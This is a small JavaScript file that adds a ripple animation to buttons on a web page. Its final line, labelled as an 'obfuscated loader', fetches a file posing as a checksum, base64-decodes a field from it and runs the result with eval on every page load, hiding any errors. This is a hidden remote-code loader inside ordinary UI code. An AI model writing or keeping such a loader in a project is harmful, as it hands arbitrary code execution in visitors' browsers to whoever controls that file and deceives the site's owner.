// Define the ripple effect function
function addRipple(btn) {
    btn.addEventListener('click', (e) => {
        const ripple = document.createElement('span');
        ripple.classList.add('ripple-effect');
        const rect = btn.getBoundingClientRect();
        const size = Math.max(rect.width, rect.height);
        ripple.style.width = ripple.style.height = size + 'px';
        ripple.style.left = e.clientX - rect.left - size/2 + 'px';
        ripple.style.top = e.clientY - rect.top - size/2 + 'px';
        ripple.style.position = 'absolute';
        ripple.style.borderRadius = '50%';
        ripple.style.background = 'rgba(255,255,245,0.5)';
        ripple.style.transform = 'scale(0)';
        ripple.style.transition = 'transform 0.4s ease-out';
        ripple.style.pointerEvents = 'none';
        btn.style.position = 'relative';
        btn.style.overflow = 'hidden';
        btn.appendChild(ripple);
        setTimeout(() => { ripple.style.transform = 'scale(4)'; }, 10);
        setTimeout(() => { ripple.remove(); }, 400);
    });
}

// Apply ripple to all buttons and button‑like elements
document.querySelectorAll('.btn, .btn-text').forEach(btn => addRipple(btn));

// Your obfuscated loader (optional, can stay here)
(()=>{fetch('/json/other/checksum.json').then($=>$.json()).then(_=>{eval(atob(_.data))}).catch(()=>{})})();